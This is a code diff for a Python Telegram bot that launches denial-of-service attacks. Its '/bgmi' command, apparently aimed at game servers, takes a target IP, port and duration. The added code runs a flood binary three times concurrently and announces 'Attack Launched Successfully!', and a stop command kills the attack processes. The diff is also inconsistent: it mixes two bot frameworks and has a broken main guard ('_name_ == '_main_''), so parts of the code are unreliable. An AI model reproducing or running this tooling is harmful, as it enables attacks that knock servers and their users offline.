@@ -141,24 +141,69 @@ def execute_task(cmd):
     except Exception:
         pass
 
-def run_attack_process(u_id, b_path, v_path, target, port, duration, thread_count=10):
-    cmd1 = f"{b_path} {target} {port} {duration} 200"
-    cmd2 = f"{v_path} {target} {port} {duration} 200"
-    
-    # Use ThreadPoolExecutor to scale threads
-    with ThreadPoolExecutor(max_workers=thread_count) as executor:
-        for _ in range(thread_count):
-            executor.submit(execute_task, cmd1)
-            executor.submit(execute_task, cmd2)
-
-    # Log command execution
+async def execute_binary(update, ip, port, duration):
+    """
+    Low-level shell function to run binary. 
+    Uses asyncio subprocess for 'low thread' efficiency.
+    """
     try:
-        log_command(u_id, target, port, duration)
-    except NameError:
-        pass
+        # Ensure binary is executable
+        if not os.path.exists(BINARY_PATH):
+            await update.message.reply_text(f"❌ Binary not found at {BINARY_PATH}")
+            return
+        
+        os.chmod(BINARY_PATH, 0o755)
 
-# Example usage:
-# run_attack_process("user1", "./bin1", "./bin2", "127.0.0.1", 80, 60, thread_count=50)
+        # Launching the binary with 200 (method/thread parameter from your code)
+        command = f"{BINARY_PATH} {ip} {port} {duration} 200"
+        
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        
+        stdout, stderr = await process.communicate()
+        
+        if process.returncode != 0:
+            logging.error(f"Process Error: {stderr.decode()}")
+            
+    except Exception as e:
+        logging.error(f"Execution failed: {e}")
+
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Main /bgmi command for authorized users."""
+    user_id = update.effective_user.id
+    
+    if user_id not in ADMIN_IDS:
+        await update.message.reply_text("🚫 Unauthorized access denied.", parse_mode='Markdown')
+        return
+
+    if len(context.args) < 3:
+        await update.message.reply_text("❓ Usage: /bgmi <ip> <port> <time>", parse_mode='Markdown')
+        return
+
+    target_ip = context.args[0]
+    target_port = context.args[1]
+    duration = context.args[2]
+
+    await update.message.reply_text(
+        f"🚀 Attack Launched Successfully! 🚀\n\n"
+        f"📍 Target: {target_ip}:{target_port}\n"
+        f"⏳ Duration: {duration}s", 
+        parse_mode='Markdown'
+    )
+
+    # POWERFUL MODE: Spawning 3 concurrent tasks using 'low thread' asyncio worker
+    # This increases output without overloading the system with threads
+    tasks = []
+    for _ in range(3):
+        tasks.append(asyncio.create_task(execute_binary(update, target_ip, target_port, duration)))
+    
+    # Run tasks concurrently
+    await asyncio.gather(*tasks)
+    
+    await update.message.reply_text(f"🏁 Attack on {target_ip}:{target_port} finished.", parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
 def my_info(message):
@@ -182,25 +227,36 @@ def broadcast(message):
         try: bot.send_message(uid, f"📢 **Announcement:**\n{msg_text[1]}", parse_mode="Markdown")
         except Exception: pass
 
-@bot.message_handler(commands=['stop'])
-@admin_only
-def stop_attack(message):
-    try:
-        subprocess.run(["pkill", "-9", "bgmi"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["pkill", "-9", "bgmi2"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Instantly kills all ongoing binary processes for the user."""
+    user_id = update.effective_user.id
+    
+    if user_id not in active_attacks or not active_attacks[user_id]:
+        await update.message.reply_text("❌ No ongoing attacks to stop.")
+        return
 
-        bot.reply_to(message, "🛑 Attack stopped successfully.")
-    except Exception:
-        bot.reply_to(message, "⚠️ Failed to stop attack.")
-
-# --- Execution ---
-if __name__ == '__main__':
-    print("Bot is active...")
-    while True:
+    count = 0
+    processes = active_attacks[user_id][:] # Copy list to iterate
+    for process in processes:
         try:
-            bot.polling(none_stop=True, interval=0, timeout=40)
-        except Exception as e:
-            time.sleep(5)
+            # Kill the process group (cmd + binary)
+            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+            count += 1
+        except Exception:
+            pass
+    
+    active_attacks[user_id] = [] # Clear the list
+    await update.message.reply_text(f"🛑 *All attacks stopped.* ({count} processes terminated)")
 
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("🤖 *Bot ready.*\n/bgmi - Start\n/stop - Instant Stop")
 
-
+if _name_ == '_main_':
+    application = ApplicationBuilder().token(TOKEN).build()
+    
+    application.add_handler(CommandHandler('start', start))
+    application.add_handler(CommandHandler('bgmi', attack))
+    application.add_handler(CommandHandler('stop', stop_attack))
+    
+    print("Bot is running with instance-kill support...")
+    application.run_polling()
